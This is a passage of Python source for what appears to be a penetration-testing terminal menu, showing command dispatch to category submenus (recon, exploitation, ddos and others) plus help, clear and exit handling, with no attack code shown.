                "proxy_settings": self.proxy_settings_interactive,
            }
            
            if command in handlers:
                handlers[command]()
        
        # Main menu selections (enter submenu)
        else:
            category_commands = ["recon", "scanning", "enumeration", "exploitation", 
                               "payloads", "post_exploit", "network", "web", 
                               "osint", "vuln_scan", "ddos", "bruteforce", "crypto", "fuzzing"]
            
            if command in category_commands:
                self.navigator.enter_submenu()
            elif command == "settings":
                self.navigator.enter_submenu()
            elif command == "clear":
                os.system('clear' if os.name == 'posix' else 'cls')
            elif command == "help":
                self.show_help()
            elif command == "exit":
                print(f"\n{Fore.GREEN}[+] Goodbye!{Style.RESET_ALL}")
                sys.exit(0)


def main():
    """Main entry point"""
    try:
        terminal = PentestTerminal()
        terminal.run_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
